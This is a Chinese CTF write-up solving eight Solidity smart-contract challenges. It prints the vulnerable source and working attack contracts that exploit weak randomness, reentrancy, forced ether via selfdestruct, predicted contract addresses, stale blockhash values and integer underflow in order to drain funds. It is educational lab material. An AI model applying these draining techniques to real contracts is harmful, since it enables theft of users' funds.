> 原文链接: https://www.anquanke.com//post/id/231470 


# innovation blockchain 智能合约题目（下）


                                阅读量   
                                **230006**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p1.ssl.qhimg.com/t0155d2b391cb514573.jpg)](https://p1.ssl.qhimg.com/t0155d2b391cb514573.jpg)



## 前言：

上一篇我们主要介绍了一些基础知识以及技能。和题目做题方法。

接下来这篇文章将讲述接下来的5道题目。

主要以主流漏洞以及脚本编写为主。也会给出源代码分析以及exp

## Lottery

题目不是很长

给出以下源代码

```
pragma solidity 0.4.24;

import "../CtfFramework.sol";
import "../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol";

contract Lottery is CtfFramework`{`

    using SafeMath for uint256;

    uint256 public totalPot;

    constructor(address _ctfLauncher, address _player) public payable
        CtfFramework(_ctfLauncher, _player)
    `{`
        totalPot = totalPot.add(msg.value);
    `}`

    function() external payable ctf`{`
        totalPot = totalPot.add(msg.value);
    `}`

    function play(uint256 _seed) external payable ctf`{`
        require(msg.value &gt;= 1 finney, "Insufficient Transaction Value");
        totalPot = totalPot.add(msg.value);
        bytes32 entropy = blockhash(block.number);
        bytes32 entropy2 = keccak256(abi.encodePacked(msg.sender));
        bytes32 target = keccak256(abi.encodePacked(entropy^entropy2));
        bytes32 guess = keccak256(abi.encodePacked(_seed));
        if(guess==target)`{`
            //winner
            uint256 payout = totalPot;
            totalPot = 0;
            msg.sender.transfer(payout);
        `}`
    `}`    


`}`
```

可以发现这里transfer 需要 首先转账大于 1 finney

后面就是比较经典的漏洞。随机数预测 只需要直接照抄即可。

可能前面大家会发现合约调用发现revert问题，是因为没有给予做题权限，

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://md.byr.moe/uploads/upload_0c386bfafbc469e61342a46f8fb36d84.png)

我们要在这里的`ctf_challenge`给我们的合约一个做题权限。

给出exp

```
contract hack`{`
    address target=challenge address;
    Lottery A=Lottery(target);
    constructor()payable`{``}`
    function exp()payable`{`
        bytes32 entropy = block.blockhash(block.number);
        bytes32 entropy2 = keccak256(this);
        uint256 seeds = uint256(entropy^entropy2);
        A.play.value(1 finney)(seeds);
        selfdestruct(your address);
    `}`
    function() payable`{``}`
`}`
```

首先 带 2finney 部署 然后调用ctf_challenge 再调用exp就可以了。

## [![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://md.byr.moe/uploads/upload_15f2da9cc50fcdace4bc4f3a1aa85d62.png)



## Record Label

这里主要是逻辑问题。

代码段比较长我这里只做部分摘取

```
function withdrawFundsAndPayRoyalties(uint256 _withdrawAmount) external ctf`{`
        require(_withdrawAmount&lt;=funds, "Insufficient Funds in Contract");
        funds = funds.sub(_withdrawAmount);
        royalties.call.value(_withdrawAmount)();
        uint256 royaltiesPaid = Royalties(royalties).getLastPayoutAmountAndReset();
        uint256 artistPayout = _withdrawAmount.sub(royaltiesPaid); 
        msg.sender.transfer(artistPayout);
    `}`
```

这里点的函数进行了一个转账功能。

我们可以传一个比合约内已有金额小的数字进行一个转账的操作

然后跟一下里面的。 首先是把一个传入的金额减去 然后直接转账给我们的合约创建者 royalties 之后进行了 函数getLast…的调用。

```
function getLastPayoutAmountAndReset() external isCollectionsContract returns(uint256)`{`
        uint256 ret = amountPaid;
        amountPaid = 0;
        return ret;
    `}`
```

这里以 amountpaid 为基准减去一个值 但是因为前面未调用相关。所以这里直接转账就是0了

我们这里只需要调用withdrawFundsAndPayRoyalties 转账1 eth 即可成功。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://md.byr.moe/uploads/upload_f66e79df17eb7cd0ed220e058e633808.png)

但其实整个合约的思路应该是我们每次想转都会给一定的手续费给予另一边，但是这里我们不需要理清太多的思路只需要找到关键的函数即可

## Heads or Tails

题目不长给出完整代码

```
pragma solidity 0.4.24;

import "../CtfFramework.sol";
import "../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol";

contract HeadsOrTails is CtfFramework`{`

    using SafeMath for uint256;

    uint256 public gameFunds;
    uint256 public cost;

    constructor(address _ctfLauncher, address _player) public payable
        CtfFramework(_ctfLauncher, _player)
    `{`
        gameFunds = gameFunds.add(msg.value);
        cost = gameFunds.div(10);
    `}`

    function play(bool _heads) external payable ctf`{`
        require(msg.value == cost, "Incorrect Transaction Value");
        require(gameFunds &gt;= cost.div(2), "Insufficient Funds in Game Contract");
        bytes32 entropy = blockhash(block.number-1);
        bytes1 coinFlip = entropy[0] &amp; 1;
        if ((coinFlip == 1 &amp;&amp; _heads) || (coinFlip == 0 &amp;&amp; !_heads)) `{`
            //win
            gameFunds = gameFunds.sub(msg.value.div(2));
            msg.sender.transfer(msg.value.mul(3).div(2));
        `}`
        else `{`
            //loser
            gameFunds = gameFunds.add(msg.value);
        `}`
    `}`

`}`
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://md.byr.moe/uploads/upload_0ea1d52498778603ecefa84663939c9e.png)

这个完全可以理解为 coinFlip == _heads （题目中不同变量类型）

总之还是 随机数的漏洞我们直接编写脚本即可。

注意每次传入的是0.1eth 然后我们可以得到 0.1*3/2 = 0.15

但是每次我传了 0.1 那么每次可以多得到0.05

为了把1 eth全赢回来需要赢得20次循环调用即可（类似薅羊毛）

```
contract hack`{`
    address target=challenge address;
    HeadsOrTails A=HeadsOrTails(target);
    constructor()payable`{``}`
    function exp() payable
    `{`
        for(uint i=1;i&lt;=20;i++)
        `{`
        bytes32 entropy = blockhash(block.number-1);
        bytes1 coinFlip = entropy[0] &amp; 1;
        if(coinFlip==1)
        `{`
            A.play.value(100000000000000000)(true);
        `}`
        else
           A.play.value(100000000000000000)(false);
        `}`

        selfdestruct(your address);
    `}`
    function ()payable`{``}`

`}`
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://md.byr.moe/uploads/upload_ae3a29afe74717a17f8f99ea46592f14.png)

具体步骤和Lottery 一样 记住要给攻击合约 多点钱 我给了1 eth.

## Trust Fund

代码如下

```
pragma solidity 0.4.24;

import "../CtfFramework.sol";
import "../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol";

contract TrustFund is CtfFramework`{`

    using SafeMath for uint256;

    uint256 public allowancePerYear;
    uint256 public startDate;
    uint256 public numberOfWithdrawls;
    bool public withdrewThisYear;
    address public custodian;

    constructor(address _ctfLauncher, address _player) public payable
        CtfFramework(_ctfLauncher, _player)
    `{`
        custodian = msg.sender;
        allowancePerYear = msg.value.div(10);        
        startDate = now;
    `}`

    function checkIfYearHasPassed() internal`{`
        if (now&gt;=startDate + numberOfWithdrawls * 365 days)`{`
            withdrewThisYear = false;
        `}` 
    `}`

    function withdraw() external ctf`{`
        require(allowancePerYear &gt; 0, "No Allowances Allowed");
        checkIfYearHasPassed();
        require(!withdrewThisYear, "Already Withdrew This Year");
        if (msg.sender.call.value(allowancePerYear)())`{`
            withdrewThisYear = true;
            numberOfWithdrawls = numberOfWithdrawls.add(1);
        `}`
    `}`

    function returnFunds() external payable ctf`{`
        require(msg.value == allowancePerYear, "Incorrect Transaction Value");
        require(withdrewThisYear==true, "Cannot Return Funds Before Withdraw");
        withdrewThisYear = false;
        numberOfWithdrawls=numberOfWithdrawls.sub(1);
    `}`
`}`
```

熟悉的看了就懂了 `withdraw`处 的`msg.sender.call.value`造成的重入。

因为是先转账并且没有进行及时的修改状态造成重入

依旧写脚本

```
contract hack`{`
    address target=challenge address;
    TrustFund A=TrustFund(target);
    uint time;
    constructor()payable`{`time=1;`}`
    function () payable`{`
        while(time&lt;=9)`{`
            time++;
        A.withdraw();
        `}`
    `}`
    function exp()payable`{`
        A.withdraw();
    `}`
    function dest()`{`
        selfdestruct(your addess);
    `}`

`}`
```

这里有两点需要注意

一个是重入时候需要大量的gas 否则 无法完成交易。并且不会报错 需要查Ropsten事件才能发现。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://md.byr.moe/uploads/upload_cc1c2d163ca9539071131f6bc7b24b7e.png)

还有一个是我们在fallback函数中需要先加time再调用否则会陷入死循环。和逻辑洞一样。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://md.byr.moe/uploads/upload_f7be6d39439369a04643244e4f8c9a81.png)

## Slot Machine

这里给出源代码

```
pragma solidity 0.4.24;

import "../CtfFramework.sol";
import "../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol";

contract SlotMachine is CtfFramework`{`

    using SafeMath for uint256;

    uint256 public winner;

    constructor(address _ctfLauncher, address _player) public payable
        CtfFramework(_ctfLauncher, _player)
    `{`
        winner = 5 ether;
    `}`

    function() external payable ctf`{`
        require(msg.value == 1 szabo, "Incorrect Transaction Value");
        if (address(this).balance &gt;= winner)`{`
            msg.sender.transfer(address(this).balance);
        `}`
    `}`

`}`
```

意思是我们需要先把里面的钱变成 5eth 以上

才能提出来所有的钱，

但是每次只能冲 1 szabo

非常少

不可能每次都用这个来冲

我们可以想到selfdestruct 这个函数 他不会引起 payable fallback的调用

所以我们充3.5eth进去

然后再转入1 szabo 即可成功。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://md.byr.moe/uploads/upload_89dc4c8c586dae4d147ab2faf23c0bfa.png)

## 小结：

这里的五道题大概是比较简单的难度。

一定程度的教会了 一些简单的漏洞以及脚本的编写 和debug能力。

通过etherscan等网站可以快速定位我们的代码问题以及调用效果等等。

最后我会详细介绍下后三道题 是相对来说难度较大一些的题目。

里面涉及到了字节码以及内联汇编 和block等问题。

那么接下来的三道题目难度会提升一个档，可以更加深入的理解合约以及区块链相关的知识。

## Rainy Day Fund

合约代码给出

```
pragma solidity 0.4.24;

import "../CtfFramework.sol";

contract DebugAuthorizer`{`

    bool public debugMode;

    constructor() public payable`{`
        if(address(this).balance == 1.337 ether)`{`
            debugMode=true;
        `}`
    `}`
`}`

contract RainyDayFund is CtfFramework`{`

    address public developer;
    mapping(address=&gt;bool) public fundManagerEnabled;
    DebugAuthorizer public debugAuthorizer;

    constructor(address _ctfLauncher, address _player) public payable
        CtfFramework(_ctfLauncher, _player)
    `{`
        //debugAuthorizer = (new DebugAuthorizer).value(1.337 ether)(); // Debug mode only used during development
        debugAuthorizer = new DebugAuthorizer();
        developer = msg.sender;
        fundManagerEnabled[msg.sender] = true;
    `}`

    modifier isManager() `{`
        require(fundManagerEnabled[msg.sender] || debugAuthorizer.debugMode() || msg.sender == developer, "Unauthorized: Not a Fund Manager");
         _;
    `}`

    function () external payable ctf`{`
        // Anyone can add to the fund    
    `}`

    function addFundManager(address _newManager) external isManager ctf`{`
        fundManagerEnabled[_newManager] = true;
    `}`

    function removeFundManager(address _previousManager) external isManager ctf`{`
        fundManagerEnabled[_previousManager] = false;
    `}`

    function withdraw() external isManager ctf`{`
        msg.sender.transfer(address(this).balance);
    `}`
`}`
```

题目主要目标是调用 withdraw 但是每个函数都是需要我们的 isManager 修饰器，以及 ctf 修饰器，ctf修饰器就是我们的ctf_challenge函数即可。

但是isManager可以看到

```
modifier isManager() `{`
        require(fundManagerEnabled[msg.sender] || debugAuthorizer.debugMode() || msg.sender == developer, "Unauthorized: Not a Fund Manager");
         _;
    `}`
```

但是我们最开始不可能操作的是fundManager 和 msg,sender.

只有这个debug 是可能使用的。

```
contract DebugAuthorizer`{`

    bool public debugMode;

    constructor() public payable`{`
        if(address(this).balance == 1.337 ether)`{`
            debugMode=true;
        `}`
    `}`
`}`
```

可以发现 只要我们 提前往这个合约里面转账1.337 eth 我们就可以开启debug mode 从而实现任意给予权限 来提出余额。

所以这里考点就是 create的计算方式。

```
import rlp
from ethereum import utils
address = 0x6c6cabbbbfee4ecd2a3f68d427883975bdb36a3a
def calc(i):
    nonce=i
    rlp_res = rlp.encode([address, nonce])
   # print(rlp_res)
    sha3_res = utils.mk_contract_address(address, nonce)
    #print(sha3_res)
    sha3_res_de = utils.decode_addr(sha3_res)
    print("contract_address: " + sha3_res_de)


def hack(mubiao):
    for i in range(0,500000):
        nonce=i
        rlp_res = rlp.encode([address,nonce])
        #print(rlp_res)
        sha3_res = utils.mk_contract_address(address,nonce)
        #print(sha3_res)
        sha3_res_de = utils.decode_addr(sha3_res)
        #print("contract_address: " + sha3_res_de)
        if sha3_res_de==mubiao:
            print("Right:`{``}`".format(i))
            break
str='1903a99b906943dc56fca3f652e799493ae82054'
str1='7d30443753e0eb8f217da3201b721f9b28ff57b8'
str2='81f19dee034dd328cae528bbd5b8f6bc964c69ee'
#hack(str)
#hack(str1)
#hack(str2)
calc(1)
```

[![](https://p0.ssl.qhimg.com/t016faf9a8b9178cfde.png)](https://p0.ssl.qhimg.com/t016faf9a8b9178cfde.png)

上面的nonce 没看懂怎么算，考虑爆破出nonce 注意在 etherscan 上字母有大小写。 记得跑python 时候全部改成小写

通过如此可以算出来了。

然后提前转账 1.377 ether

然后直接at address 后直接调用 addFundManager

```
pragma solidity 0.4.24;
contract hack`{`
    address target= 算出来debug 合约地址;
    constructor ()payable
    `{`
        target.transfer(1.337 ether);
    `}`
    function() payable`{``}`
`}`
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01b97bf0bc13f1adee.png)

## Raffle

这个题目有点像华为第三场的那题。

```
contract Raffle is CtfFramework`{`

    uint256 constant fee = 0.1 ether;

    address private admin;

    bytes4 private winningTicket;
    uint256 private blocknum;

    uint256 public ticketsBought;
    bool public raffleStopped;

    mapping(address=&gt;uint256) private rewards;
    mapping(address=&gt;bool) private potentialWinner;
    mapping(address=&gt;bytes4) private ticketNumbers;

    constructor(address _ctfLauncher, address _player) public payable
        CtfFramework(_ctfLauncher, _player)
    `{`
        rewards[address(this)] = msg.value;
        admin = msg.sender;
    `}`

    function buyTicket() external payable ctf`{`
        if(msg.value &gt;= fee)`{`
            winningTicket = bytes4(0);
            blocknum = block.number+1;
            ticketsBought += 1;
            raffleStopped = false;
            rewards[msg.sender] += msg.value;
            ticketNumbers[msg.sender] = bytes4((msg.value - fee)/10**8);
            potentialWinner[msg.sender] = true;
        `}`
    `}`

    function closeRaffle() external ctf`{`
        require(ticketsBought&gt;0);
        require(!raffleStopped);
        require(blocknum != 0);
        require(winningTicket == bytes4(0));
        require(block.number&gt;blocknum);
        require(msg.sender==admin || rewards[msg.sender]&gt;0);
        winningTicket = bytes4(blockhash(blocknum));
        potentialWinner[msg.sender] = false;
        raffleStopped = true;
    `}`

    function collectReward() external payable ctf`{`
        require(raffleStopped);
        require(potentialWinner[msg.sender]);
        rewards[address(this)] += msg.value;
        if(winningTicket == ticketNumbers[msg.sender])`{`
            msg.sender.transfer(rewards[msg.sender]);
            msg.sender.transfer(rewards[address(this)]); 
            rewards[msg.sender] = 0;
            rewards[address(this)] = 0;
        `}`
    `}`

    function skimALittleOffTheTop(uint256 _value) external ctf`{`
        require(msg.sender==admin);
        require(rewards[address(this)]&gt;_value);
        rewards[address(this)] = rewards[address(this)] - _value;
        msg.sender.transfer(_value);
    `}`

    function () public payable ctf`{`
        if(msg.value&gt;=fee)`{`
            this.buyTicket();
        `}`
        else if(msg.value == 0)`{`
            this.closeRaffle();
        `}`
        else`{`
            this.collectReward();
        `}`
    `}`

`}`
```

这个需要的是调用collectreward。

然后前面的前置条件我们可以发现这些条件都可以被buyticket 中的前几个满足。

还有一个raffleStopped 需要变成true 。

那这里我们发现fallback可以成功的调用，然后这里有一个未来随机数，所以这个随机数是不可以被预测的，但是区块链中计算区块 只会对相邻的256个区块进行计算，对于256个区块之前的函数就只会返回 0 值。

所以这里攻击链可以梳理出来了。

我们首先攻击合约buyticket然后这里已经触发了第一个&gt;=fee的fallback。

然后把题目合约加入到ctf_challenge 中，因为我们的题目要自行调用closeRaffle函数。否则会revert的。

最后我们等待256区块后在触发closeRaffle函数最后在调用转账函数即可成功。

给出exp

```
contract exp`{`
    address target=challenge address;
    Raffle A = Raffle(target);
    constructor()payable`{``}`
    function exp1()payable
    `{`
        A.buyTicket.value(0.1 ether)();
        A.ctf_challenge_add_authorized_sender(target);
    `}`
    function exp2()payable
    `{`
        target.call.value(0 ether)();
        A.collectReward();
    `}`
    function() payable`{``}`
    function dest()public`{`
        selfdestruct(your address);
    `}`
`}`
```

[![](https://p4.ssl.qhimg.com/t01d268a7291c9b7a45.png)](https://p4.ssl.qhimg.com/t01d268a7291c9b7a45.png)

先调用exp1 然后等待256个区块过去， 在调用exp2.

成功调用。

## Scratchcard

给出合约的源码

```
pragma solidity 0.4.24;

import "../CtfFramework.sol";

library Address `{`
    function isContract(address account) internal view returns (bool) `{`
        uint256 size;
        assembly `{` size := extcodesize(account) `}`
        return size &gt; 0;
    `}`
`}`

contract Scratchcard is CtfFramework`{`

    event CardPurchased(address indexed player, uint256 cost, bool winner);

    mapping(address=&gt;uint256) private winCount;
    uint256 private cost;


    using Address for address;

    constructor(address _ctfLauncher, address _player) public payable
        CtfFramework(_ctfLauncher, _player)
    `{`
    `}`

    modifier notContract()`{`
        require(!msg.sender.isContract(), "Contracts Not Allowed");
        _;
    `}`

    function play() public payable notContract ctf`{`
        bool won = false;
        if((now%10**8)*10**10 == msg.value)`{`
            won = true;
            winCount[msg.sender] += 1;
            cost = msg.value;
            msg.sender.transfer(cost);
        `}`
        else`{`
            cost = 0;
            winCount[msg.sender] = 0;
        `}`
        emit CardPurchased(msg.sender, msg.value, won);
    `}`    

    function checkIfMegaJackpotWinner() public view returns(bool)`{`
        return(winCount[msg.sender]&gt;=25);
    `}`

    function collectMegaJackpot(uint256 _amount) public notContract ctf`{`
        require(checkIfMegaJackpotWinner(), "User Not Winner");
        require(2 * cost - _amount &gt; 0, "Winners May Only Withdraw Up To 2x Their Scratchcard Cost");
        winCount[msg.sender] = 0;
        msg.sender.transfer(_amount);
    `}`

    function () public payable ctf`{`
        play();
    `}`

`}`
```

这个题可以说是最拔高的一道题了。

首先这里有一个library 定义了一个 规则，他要求我们的调用者不能是一个 存在一个 size&gt;0 的合约，那我们想操作的话 只能在constructor 进行所有的操作。

那我们就还是需要提前计算 我们部署的合约地址，然后在第三方合约的constructor 函数中部署好所有的攻击操作。

才能成功攻击合约。

然后我们来查看一下攻击链，目标是能够调用 collectMega 这个函数 首先是需要 check过，check过的话是需要win 25次。

然后需要 2cost-amount &gt;0 这里没有使用safemath 库，可以下溢出。 那么就是cost2-=amount 下溢出 还是满足大于0，所以最后直接调用转3.5ether即可。

建议一次转完 否则会像我这样<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01cf898e20d532b8a6.png)

用两个合约实现

```
contract exp`{`

    address target=challenge address;
    Scratchcard A=Scratchcard(target);
    uint time;
    constructor()payable`{`
      uint val = (now%10**8)*10**10;
        for (uint i=0; i&lt;25; i++) `{`
            A.play.value(val)();
        `}`
        A.collectMegaJackpot(0.02896594 ether);
        selfdestruct(your address);
    `}`
    function() payable`{``}`

`}`
contract hack
`{`
    exp public nice;
    constructor() payable`{``}`
    function chuang()public payable`{`
        nice=(new exp).value(1 ether)();
    `}`
`}`
```

先部署hack 然后预测create 的地址，之后调用ctf_challenge地址给予调用权限，最后再 chuang()即可

[![](https://p5.ssl.qhimg.com/t018fb42cbd99f6a081.png)](https://p5.ssl.qhimg.com/t018fb42cbd99f6a081.png)

总结：

[![](https://p5.ssl.qhimg.com/t0146efed3c169776f6.png)](https://p5.ssl.qhimg.com/t0146efed3c169776f6.png)

2天刷完了13题还是比较有成就感的。大家都可以慢慢来做一做

通过以上这些题目应该可以初步的对智能合约尤其是ctf中的题目有一个初步的了解。美中不足是现在的题目大多不会给出源码。所以我们可以自行利用各种decompile网站或者软件分析。
